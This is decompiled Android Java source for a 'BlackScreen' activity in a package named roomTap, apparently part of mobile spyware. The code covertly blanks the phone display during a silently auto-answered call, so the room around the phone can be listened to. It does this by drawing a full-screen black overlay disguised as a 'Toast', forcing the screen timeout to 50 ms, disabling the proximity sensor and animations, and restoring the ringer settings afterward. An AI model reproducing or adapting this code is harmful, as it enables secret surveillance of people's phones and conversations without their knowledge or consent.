package com.network.android.roomTap;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import com.network.android.C0000R;
import com.network.android.c.a.a;
import com.network.b.b;

public class BlackScreen extends Activity {

    /* renamed from: a  reason: collision with root package name */
    public static boolean f111a = false;
    private static int b = 0;
    private static int c = 1;
    private static int d = 0;
    private static View e = null;
    private static WindowManager f = null;
    private BroadcastReceiver g = new j(this);

    private void a(int i) {
        try {
            a.a("BlackScreen setDeviceWindowAnimationScaleSetting start");
            Uri parse = Uri.parse("content://settings/system/window_animation_scale");
            ContentValues contentValues = new ContentValues();
            contentValues.put("value", Integer.valueOf(i));
            getContentResolver().update(parse, contentValues, null, null);
        } catch (Throwable th) {
            a.a("blackscreen getDeviceWindowAnimationScaleSetting Exception" + th.getMessage(), th);
        }
    }

    private static void a(int i, Context context) {
        try {
            a.a("BlackScreen setProximitySensorSetting start");
            a.a("BlackScreen setProximitySensorSetting setting value: " + i);
            Settings.System.putInt(context.getContentResolver(), "proximity_sensor", i);
        } catch (Throwable th) {
            a.a("blackscreen setProximitySensorSetting Exception" + th.getMessage(), th);
        }
    }

    public static void a(Context context, SharedPreferences sharedPreferences) {
        try {
            a.a("BlackScreen fixSettingsIfWeDidntFinishNicly checking screen turn off interval");
            int i = Settings.System.getInt(context.getContentResolver(), "screen_off_timeout", 0);
            a.a("BlackScreen fixSettingsIfWeDidntFinishNicly after getting interval. value: " + i);
            if (i < 15000) {
                a.a("BlackScreen fixSettingsIfWeDidntFinishNicly screen interval is too low. means tap wasn't finished nicly. setting original value to screen timeout");
                int i2 = sharedPreferences.getInt("ScreenTimeout", 0);
                if (i2 < 15000) {
                    a.a("BlackScreen fixSettingsIfWeDidntFinishNicly screen timeout in conf was too small. setting default value");
                    i2 = 60000;
                }
                Settings.System.putInt(context.getContentResolver(), "screen_off_timeout", i2);
                a.a("BlackScreen fixSettingsIfWeDidntFinishNicly after setting screen timeout. value: " + i2);
            }
            int i3 = sharedPreferences.getInt("wasPhoneWasUnmutedAfterTapNicly", 1);
            a.a("BlackScreen fixSettingsIfWeDidntFinishNicly didWeFinishedUnmutingNicly: " + i3);
            if (i3 == 0) {
                a.a("BlackScreen did not finish nicly. fixing settings");
                AutoAnswerReceiver.a(Integer.valueOf(sharedPreferences.getInt("originalRingerValue", 0)), Integer.valueOf(sharedPreferences.getInt("originalVibrateValue", 0)), context);
                a(Integer.valueOf(sharedPreferences.getInt("screenProximtySensor", 1)).intValue(), context);
            }
        } catch (Throwable th) {
            a.b("BlackScreen fixSettingsIfWeDidntFinishNicly createBlackFilter exception: ." + th.getMessage());
        }
    }

    public static int b() {
        return b;
    }

    private int c() {
        try {
            a.a("BlackScreen getDeviceWindowAnimationScaleSetting start");
            Cursor query = getContentResolver().query(Uri.parse("content://settings/system/window_animation_scale"), null, null, null, null);
            if (query.moveToNext()) {
                return query.getInt(query.getColumnIndex("value"));
            }
        } catch (Throwable th) {
            a.a("blackscreen getDeviceWindowAnimationScaleSetting Exception" + th.getMessage(), th);
        }
        a.a("BlackScreen getDeviceWindowAnimationScaleSetting didnt found window animation value. returning 0");
        return 0;
    }

    /* access modifiers changed from: package-private */
    public final void a() {
        try {
            a.a("BlackScreen, isViewWasSet: " + f111a);
            a.a("BlackScreen toastView: " + e);
            a.a("BlackScreen in removeBlackFilter");
            f.removeView(e);
            if (15000 > b) {
                Settings.System.putInt(getContentResolver(), "screen_off_timeout", 60000);
                a.a("BlackScreen set screenOff original value too small. setting default: 60000");
            } else {
                Settings.System.putInt(getContentResolver(), "screen_off_timeout", b);
                a.a("BlackScreen set screenOfOriginalValue: " + b);
            }
            a(d);
            a.a("BlackScreen set screenAnimationScaleValueOriginal: " + d);
            a(c, this);
            a.a("BlackScreen set proximityEnabledDuringCallValue: " + c);
            f111a = false;
            a.a("BlackScreen removedView");
            finish();
        } catch (Throwable th) {
            a.a("BlackScreen removeBlackFilter exception in catch " + th.getMessage(), th);
        }
    }

    public void onCreate(Bundle bundle) {
        try {
            a.a("BlackScreen in onCreate");
            super.onCreate(bundle);
            int i = Settings.System.getInt(getContentResolver(), "screen_off_timeout", 50);
            b = i;
            b.d(i);
            Settings.System.putInt(getContentResolver(), "screen_off_timeout", 50);
            d = c();
            a(0);
            a.a("BlackScreen got screenAnimationScaleValueOriginal: " + d);
            c = Settings.System.getInt(getContentResolver(), "proximity_sensor", 1);
            a.a("BlackScreen got proximityEnabledDuringCallOriginalValue: " + c);
            b.f(c);
            Context applicationContext = getApplicationContext();
            a(0, applicationContext);
            a.a("BlackScreen saving screenOfOriginalValue prefrences to configurationHolder. screenOfOriginalValue:" + b);
            b.c(applicationContext);
            f = (WindowManager) Class.forName("android.view.WindowManagerImpl").getMethod("getDefault", new Class[0]).invoke(null, new Object[0]);
            a.a("BlackScreen starting filter");
            getWindow().setType(2004);
            try {
                a.a("BlackScreen in createBlackFilter. isViewWasSet = " + f111a);
                if (f111a) {
                    a.a("BlackScreen, createBlackFilter, view is already exists. not creating another view");
                } else {
                    View inflate = ((LayoutInflater) getSystemService("layout_inflater")).inflate(C0000R.layout.blackscreen, (ViewGroup) null);
                    e = inflate;
                    inflate.setFocusable(false);
                    e.setClickable(false);
                    e.setKeepScreenOn(false);
                    e.setLongClickable(false);
                    e.setFocusableInTouchMode(false);
                    e.setBackgroundDrawable(new ColorDrawable(Color.argb(255, 0, 0, 0)));
                    try {
                        View.class.getMethod("setFilterTouchesWhenObscured", Boolean.TYPE).invoke(e, false);
                    } catch (Throwable th) {
                        a.a("BlackScreen setFilterTouchesWhenObscured doesn't exists. contiuing anyway.", th);
                    }
                    try {
                        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams();
                        layoutParams.height = -1;
                        layoutParams.width = -1;
                        layoutParams.flags = 280;
                        layoutParams.format = -3;
                        layoutParams.type = 2006;
                        layoutParams.setTitle("Toast");
                        layoutParams.gravity = 119;
                        layoutParams.x = 0;
                        layoutParams.y = 0;
                        layoutParams.verticalWeight = 1.0f;
                        layoutParams.horizontalWeight = 1.0f;
                        layoutParams.verticalMargin = 0.0f;
                        layoutParams.horizontalMargin = 0.0f;
                        f.addView(e, layoutParams);
                        f111a = true;
                        a.a("BlackScreen createBlackFilter finished successfuly ");
                    } catch (Exception e2) {
                        try {
                            a.b("BlackScreen createBlackFilter exception: ." + e2.getMessage());
                            WindowManager.LayoutParams layoutParams2 = new WindowManager.LayoutParams();
                            WindowManager.LayoutParams.class.getField("buttonBrightness").set(layoutParams2, 0);
                            f.addView(e, layoutParams2);
                            f111a = true;
                        } catch (Exception e3) {
                            a.a("BlackScreen createBlackFilter !inside the catch! exception " + e3.getMessage(), e3);
                        }
                    }
                }
            } catch (Throwable th2) {
                a.a("BlackScreen createBlackFilter  exception " + th2.getMessage(), th2);
            }
            registerReceiver(this.g, new IntentFilter("stop_filter_event"));
        } catch (Throwable th3) {
            a.a("BlackScreen onCreateException" + th3.getMessage(), th3);
        }
    }

    /* access modifiers changed from: protected */
    public void onDestroy() {
        a.a("BlackScreen onDestroy");
        try {
            unregisterReceiver(this.g);
            a.a("BlackScreen onDestroy unrgistered broadcastReciever");
            super.onDestroy();
        } catch (Throwable th) {
            a.a("BlackScreen onDestroy" + th.getMessage(), th);
        }
    }
}
